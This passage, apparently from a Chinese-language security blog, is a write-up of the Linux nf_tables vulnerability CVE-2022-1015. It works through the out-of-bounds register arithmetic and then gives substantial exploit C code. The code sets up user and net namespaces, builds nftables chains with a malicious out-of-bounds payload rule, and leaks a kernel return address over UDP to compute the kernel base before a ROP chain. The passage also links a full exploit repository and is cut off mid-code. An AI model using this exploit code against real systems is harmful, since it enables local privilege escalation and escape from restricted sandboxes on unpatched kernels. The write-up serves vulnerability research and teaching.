class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">nft_payload_reduce</span><span class="params">(<span class="keyword">struct</span> nft_regs_track *track,</span></span><br><span class="line"><span class="params">			       <span class="type">const</span> <span class="keyword">struct</span> nft_expr *expr)</span></span><br><span class="line">{</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_payload</span> *<span class="title">priv</span> =</span> nft_expr_priv(expr);</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_payload</span> *<span class="title">payload</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!track-&gt;regs[priv-&gt;dreg].selector ||</span><br><span class="line">	    track-&gt;regs[priv-&gt;dreg].selector-&gt;ops != expr-&gt;ops) {</span><br><span class="line">		track-&gt;regs[priv-&gt;dreg].selector = expr;</span><br><span class="line">		track-&gt;regs[priv-&gt;dreg].bitwise = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	payload = nft_expr_priv(track-&gt;regs[priv-&gt;dreg].selector);</span><br><span class="line">	<span class="keyword">if</span> (priv-&gt;base != payload-&gt;base ||</span><br><span class="line">	    priv-&gt;offset != payload-&gt;offset ||</span><br><span class="line">	    priv-&gt;len != payload-&gt;len) {</span><br><span class="line">		track-&gt;regs[priv-&gt;dreg].selector = expr;</span><br><span class="line">		track-&gt;regs[priv-&gt;dreg].bitwise = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!track-&gt;regs[priv-&gt;dreg].bitwise)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> nft_expr_reduce_bitwise(track, expr);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>查看v5.17的代码, 发现这里判断是否reduce的函数是nft_expr_reduce, 而这个函数只是返回false.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">nf_tables_commit_chain_prepare</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> nft_chain *chain)</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line">		nft_rule_for_each_expr(expr, last, rule) {</span><br><span class="line">			track.cur = expr;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (nft_expr_reduce(&amp;track, expr)) {</span><br><span class="line">				expr = track.cur;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			}</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (WARN_ON_ONCE(data + expr-&gt;ops-&gt;size &gt; data_boundary))</span><br><span class="line">				<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">			<span class="built_in">memcpy</span>(data + size, expr, expr-&gt;ops-&gt;size);</span><br><span class="line">			size += expr-&gt;ops-&gt;size;</span><br><span class="line">		}</span><br><span class="line">......</span><br><span class="line">}</span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">nft_expr_reduce</span><span class="params">(<span class="keyword">struct</span> nft_regs_track *track,</span></span><br><span class="line"><span class="params">			    <span class="type">const</span> <span class="keyword">struct</span> nft_expr *expr)</span></span><br><span class="line">{</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>没办法, 只能换到v5.17的内核继续, 更换后不存在panic的问题.</p>
<p>现在来分析一下这个越界偏移读写的细节.<br>经过nft_parse_register后, reg的值范围为0~0xfffffffb.<br> 设reg为x, len为y, 则转化成下列数学问题.</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(4*x+y) &amp; 0xffffffff &lt; 0x50</span><br><span class="line">0 &lt;= x &lt;= 0xfffffffb</span><br><span class="line">0 &lt;= y &lt;= 0xff (对于nft_payload来说)</span><br><span class="line">4*x+y &gt;= 0x100000000</span><br><span class="line"></span><br><span class="line">求4*(x &amp; 0xff)的最小值和4*(x &amp; 0xff) + y 的最大值</span><br></pre></td></tr></tbody></table></figure>

<p>然而笔者并不知道如何去求解, 只能选择拙劣一点的方式(<del>正确性未知</del>).</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">nft_parse_register</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> nlattr *attr)</span></span><br><span class="line">{</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> reg;</span><br><span class="line"></span><br><span class="line">	reg = ntohl(nla_get_be32(attr));</span><br><span class="line">	<span class="keyword">switch</span> (reg) {</span><br><span class="line">	<span class="keyword">case</span> NFT_REG_VERDICT...NFT_REG_4:</span><br><span class="line">		<span class="keyword">return</span> reg * NFT_REG_SIZE / NFT_REG32_SIZE;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> reg + NFT_REG_SIZE / NFT_REG32_SIZE - NFT_REG32_00;</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<h5 id="nft-bitwise"><a href="#nft-bitwise" class="headerlink" title="nft_bitwise"></a>nft_bitwise</h5><p>按原作者的话说, nft_bitwise的len不能超过0x40(nft_regs中常规寄存器的大小), 但笔者查阅代码并未发现该限制.</p>
<blockquote>
<p>nft_bitwise can realistically only write up to 0x40 bytes of arbitrary data and read up to 0x40 bytes of stack data to the register space.</p>
</blockquote>
<p>但我们最好还是不要超过0x40比较好. 在nft_bitwise中, dreg和sreg共用一个len, 如果要使len超过0x40, 意味着dreg和sreg都需要越界, 那么我们就无法把敏感信息读到regs中或把regs中的数据写入到敏感位置. 所以这里就选择0x40了.</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4*reg + len(0x40) &lt; 0x50</span><br></pre></td></tr></tbody></table></figure>

<p>那么在不考虑溢出的情况下, 左侧表达式的范围的最大值为0x40000002C, 一共有4个溢出点.</p>
<p>以0x400000000的溢出点为例, 要在这个溢出点发生溢出, 则4*reg &gt;= 0x400000000-0x40<br>则有 0xfffffff0 &lt;= reg &lt;= 0xfffffffb.<br>校验完成后, 实际写入priv-&gt;dreg的值范围是0xf0 &lt;= dreg &lt;= 0xfb.<br>那么我们能读写的堆栈范围为: [0xf0*4,0xfb*4+0x40] == [0x3C0, 0x42C].</p>
<p>但其实你会发现限制dreg的是reg本身的取值范围0xfffffffb, 所以换一个溢出点0x200000000,<br>4*reg &gt;= 0x400000000-0x40 &amp;&amp; 4*reg &lt; 0x200000040-0x40,<br>0x7ffffff0 &lt;= reg &lt;= 0x7fffffff. 则0xf0 &lt;= dreg &lt;= 0xff.<br>那么我们能读写的堆栈范围为: [0xf0*4,0xff*4+0x40] == [0x3C0, 0x43C].</p>
<h5 id="nft-payload"><a href="#nft-payload" class="headerlink" title="nft_payload"></a>nft_payload</h5><p>同样的方式将len设为0xff, 求得 0xC1 &lt;= dreg &lt;= 0xD4.<br>dreg并没有达到本身的限制0xff, 所以取消len的限制, 把dreg=0xff带入计算, 求得len=0x54.</p>
<p>那么我们能读写的堆栈范围为: [0xC0*4,0xff*4+0x54] == [0x300, 0x450].</p>
<h5 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h5><p>我们的越界读写在栈上, 而栈中的数据随调用路径改变而变化.笔者首先尝试UDP协议, 因为它简单. 选择的hook点为LOCAL_OUT, 因为可以由sendto系统调用触发, 而不是在中断中触发.</p>
<p>在这样的情况下, 调试发现, 在我们可读写的0x300~0x450范围内, 的确有一些返回地址.<br>其中一个在偏移0x328的位置, 我们需要的只是简单的读取它泄露内核基址, 再写入ROP链即可.</p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p>EXP编写借用了原作者的板子, 完整EXP及测试环境可在此获取: <a target="_blank" rel="noopener" href="https://github.com/Polaris-Snowfall/kernel_exploit/blob/main/CVE-2022-1015/">CVE-2022-1015</a><br>你可以在netfilter网站上找到交互实例如: <a target="_blank" rel="noopener" href="https://git.netfilter.org/libnftnl/tree/examples/nft-rule-add.c">https://git.netfilter.org/libnftnl/tree/examples/nft-rule-add.c</a>.</p>
<p>首先初始化利用环境, 由于我们要配置netfilter, 而这需要CAP_NET_ADMIN.<br>所以我们需要开一个新的user_namespace和net_namespace, 让我们的exploit在受限的命名空间中拥有CAP_NET_ADMIN, 不过不用担心, 我们最终会逃出这个沙箱.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">unshare_setup</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> tmp_fd;</span><br><span class="line">    <span class="type">int</span> uid = getuid();</span><br><span class="line">    <span class="type">int</span> gid = getgid();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> err = unshare(CLONE_NEWUSER | CLONE_NEWNET);</span><br><span class="line">    <span class="keyword">if</span>(err &lt; <span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">"unshare"</span>);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">"/proc/self/setgroups"</span>, O_WRONLY);</span><br><span class="line">    write(tmp_fd, <span class="string">"deny"</span>, <span class="built_in">strlen</span>(<span class="string">"deny"</span>));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">"/proc/self/uid_map"</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">"0 %d 1"</span>, uid);</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">"/proc/self/gid_map"</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">"0 %d 1"</span>, gid);</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,_IONBF,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,_IONBF,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line">    unshare_setup();</span><br><span class="line"></span><br><span class="line">    system(<span class="string">"ip link set dev lo up"</span>);</span><br></pre></td></tr></tbody></table></figure>


<p>接下来是准备netfilter的环境. 首先初始化netlink相关.</p>
<p>然后创建一个table和一个base_chain, 将base_chain挂载到NF_INET_LOCAL_OUT的hook点.<br>但我们并不在base_chain上添加恶意规则, 而是将其作为一个filter过滤出我们真正想要的数据包, 过滤后跳转到存放恶意规则的aux_chain上. </p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mnl_socket</span>* <span class="title">nl</span> =</span> mnl_socket_open(NETLINK_NETFILTER);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mnl_socket_bind(nl, <span class="number">0</span>, MNL_SOCKET_AUTOPID) &lt; <span class="number">0</span>) {</span><br><span class="line">        perror(<span class="string">"[-] mnl_socket_bind"</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[-] Are you sure you have CAP_NET_ADMIN?.."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    }</span><br><span class="line">    <span class="type">int</span> seq = time(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *table_name = <span class="string">"exploit_table"</span>, *base_chain_name = <span class="string">"base_chain"</span>, *aux_chain_name = <span class="string">"aux_chain"</span>;</span><br><span class="line">    setup_nftables(nl, table_name, base_chain_name, &amp;seq);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create auxilitary chain</span></span><br><span class="line">    <span class="keyword">if</span> (create_chain(nl, table_name, aux_chain_name, NFPROTO_IPV4, <span class="literal">NULL</span>, &amp;seq, <span class="literal">NULL</span>)) </span><br><span class="line">        err_exit(<span class="string">"Failed creating auxiliary chain"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] Created auxiliary chain %s\n"</span>, aux_chain_name);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// base_chain rule</span></span><br><span class="line">    <span class="keyword">if</span> (create_base_chain_rule(nl, table_name, base_chain_name, NFPROTO_IPV4, <span class="literal">NULL</span>, &amp;seq)) </span><br><span class="line">        err_exit(<span class="string">"Failed creating base chain rule"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[+] Created base chain rule"</span>);</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="comment">// setup_nftables() —— create table &amp; chain</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup_nftables</span><span class="params">(<span class="keyword">struct</span> mnl_socket* nl, <span class="type">char</span>* table_name, <span class="type">char</span>* base_chain_name, <span class="type">int</span>* seq)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (create_table(nl, table_name, AF_INET, seq, <span class="literal">NULL</span>) == <span class="number">-1</span>) </span><br><span class="line">        err_exit(<span class="string">"Failed creating table"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] Created nft %s\n"</span>, table_name);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">unft_base_chain_param</span> <span class="title">bp</span>;</span></span><br><span class="line">    bp.hook_num = NF_INET_LOCAL_OUT;</span><br><span class="line">    bp.prio = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (create_chain(nl, table_name, base_chain_name, NFPROTO_IPV4, &amp;bp, seq, <span class="literal">NULL</span>))</span><br><span class="line">        err_exit(<span class="string">"Failed creating base chain"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] Created base ipv4 chain %s\n"</span>, base_chain_name);</span><br><span class="line">}</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAGIC 0x4c4c4146574f4e53 <span class="comment">//SNOWFALL</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">create_base_chain_rule</span><span class="params">(<span class="keyword">struct</span> mnl_socket* nl, <span class="type">char</span>* table_name, <span class="type">char</span>* chain_name, <span class="type">uint16_t</span> family, <span class="type">uint64_t</span>* handle, <span class="type">int</span>* seq)</span></span><br><span class="line">{</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nftnl_rule</span>* <span class="title">r</span> =</span> build_rule(table_name, chain_name, family, handle);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 添加rule获取目的端口 (保存到 register 8): UDP header 的目的端口位于偏移2处, 占2字节长</span></span><br><span class="line">    rule_add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, offsetof(<span class="keyword">struct</span> udphdr, dest), <span class="keyword">sizeof</span>(<span class="type">uint16_t</span>), <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 若目标端口不匹配, 则rule会接收该包, 避免 server socket 发包带来的噪声; </span></span><br><span class="line">    <span class="comment">// 注意: server socket 和 client socket 端在 do_chain() 中的栈结构不同</span></span><br><span class="line">    <span class="type">uint16_t</span> dest_port = htons(<span class="number">9999</span>);</span><br><span class="line">    rule_add_cmp(r, NFT_CMP_EQ, <span class="number">8</span>, &amp;dest_port, <span class="keyword">sizeof</span> dest_port);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 获取 header 的前8字节，若和 magic 值不匹配, 则rule会接收该包</span></span><br><span class="line">    <span class="comment">// 这样能确保只处理我们想处理的 packet</span></span><br><span class="line">    rule_add_payload(r, NFT_PAYLOAD_INNER_HEADER, <span class="number">0</span>, <span class="number">8</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> magic = MAGIC;</span><br><span class="line">    rule_add_cmp(r, NFT_CMP_EQ, <span class="number">8</span>, &amp;magic, <span class="keyword">sizeof</span> magic);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 若 packet 通过这些检查, 则跳转到 auxiliary chain</span></span><br><span class="line">    rule_add_immediate_verdict(r,  NFT_GOTO, <span class="string">"aux_chain"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将rule提交给内核</span></span><br><span class="line">    <span class="keyword">return</span> send_batch_request(</span><br><span class="line">        nl,</span><br><span class="line">        NFT_MSG_NEWRULE | (NFT_TYPE_RULE &lt;&lt; <span class="number">8</span>),</span><br><span class="line">        NLM_F_CREATE, family, (<span class="type">void</span>**)&amp;r, seq,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>尝试将恶意规则添加到aux_chain中, 这个规则将越界读出偏移0x328位置的返回地址存放到数据包+8的位置, 如果该规则成功添加, 说明目标内核存在该漏洞.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vuln_expr_params</span> <span class="title">v</span>;</span></span><br><span class="line"></span><br><span class="line">v.max_len = <span class="number">0xff</span>;</span><br><span class="line">v.value = <span class="number">0x7fffffCA</span>+<span class="number">4</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nftnl_rule</span>* <span class="title">aux_rule</span> =</span> build_rule(table_name, aux_chain_name, NFPROTO_IPV4, <span class="literal">NULL</span>);</span><br><span class="line">rule_add_payload_set(aux_rule, NFT_PAYLOAD_INNER_HEADER, <span class="number">8</span>, v.max_len, v.value);</span><br><span class="line"></span><br><span class="line">err = send_batch_request(</span><br><span class="line">    nl,</span><br><span class="line">    NFT_MSG_NEWRULE | (NFT_TYPE_RULE &lt;&lt; <span class="number">8</span>),</span><br><span class="line">    NLM_F_CREATE, NFPROTO_IPV4, (<span class="type">void</span>**)&amp;aux_rule, &amp;seq,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (err) <span class="comment">// 如果能成功创建rule, 说明越界的值 v.value 能够传递到内核, 存在漏洞</span></span><br><span class="line">    err_exit(<span class="string">"[-] TARGET IS NOT VULNERABLE to CVE-2022-1015!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[+] Succesfully created rule with OOB nft_payload!"</span>);</span><br><span class="line"><span class="built_in">puts</span>(CLR_GRN <span class="string">"[+] TARGET IS VULNERABLE to CVE-2022-1015!"</span> CLR_RESET);</span><br></pre></td></tr></tbody></table></figure>



<p>接下来就是触发了, 先启动一个监听进程server, 向server发送数据包, 当数据包到达LOCAL_OUT位置时触发恶意规则, 越界读出内核地址存入数据包中, server再将收到的数据包传回给我们, 即可获取到内核基址.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SERVER_HOST <span class="string">"127.0.0.1"</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SERVER_PORT 9999</span></span><br><span class="line">    <span class="type">int</span> pid = setup_listener(SERVER_HOST, SERVER_PORT, leak_handler); </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server_addr</span>;</span></span><br><span class="line">    inet_aton(SERVER_HOST, &amp;server_addr.sin_addr);</span><br><span class="line">    server_addr.sin_port = htons(SERVER_PORT);</span><br><span class="line">    server_addr.sin_family = AF_INET;</span><br><span class="line">    <span class="type">socklen_t</span> server_addr_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个 UDP 套接字</span></span><br><span class="line">    <span class="type">int</span> sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);</span><br><span class="line">    <span class="keyword">if</span> (sock &lt; <span class="number">0</span>) {</span><br><span class="line">        perror(<span class="string">"Socket creation failed"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    buff[<span class="number">0</span>] = MAGIC;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sendto(sock,buff , <span class="number">0x120</span>, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr*)&amp;server_addr, <span class="keyword">sizeof</span>(server_addr)) &lt; <span class="number">0</span>) {</span><br><span class="line">        perror(<span class="string">"Sendto failed"</span>);</span><br><span class="line">        close(sock);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> len = recvfrom(sock, buff, <span class="keyword">sizeof</span>(buff) - <span class="number">1</span>, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr*)&amp;server_addr, &amp;server_addr_len);</span><br><span class="line">    hexdump(buff,<span class="number">0x10</span>);    </span><br><span class="line"></span><br><span class="line">    kernel_base = buff[<span class="number">1</span>]<span class="number">-0x723ed5</span>;</span><br><span class="line">    HEX(<span class="string">"kernel_base"</span>,kernel_base);</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">setup_listener</span><span class="params">(<span class="type">char</span>* ip_string, <span class="type">uint16_t</span> port, <span class="type">int</span> (*handler)(<span class="type">int</span>))</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line">    <span class="type">int</span> s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);</span><br><span class="line">    <span class="keyword">if</span> (s &lt; <span class="number">0</span>) {</span><br><span class="line">        perror(<span class="string">"socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> reuse_addr = <span class="number">1</span>;</span><br><span class="line">    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &amp;reuse_addr, <span class="keyword">sizeof</span> reuse_addr);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">    inet_aton(ip_string, &amp;addr.sin_addr);</span><br><span class="line">    addr.sin_family = AF_INET;</span><br><span class="line">    addr.sin_port = htons(port);</span><br><span class="line">    err = bind(s, (<span class="keyword">struct</span> sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr));</span><br><span class="line">    <span class="keyword">if</span> (err &lt; <span class="number">0</span>) {</span><br><span class="line">        perror(<span class="string">"bind"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Started listener on [%s:%d] (udp)\n"</span>, ip_string, port);</span><br><span class="line"></span><br><span class="line">    <span 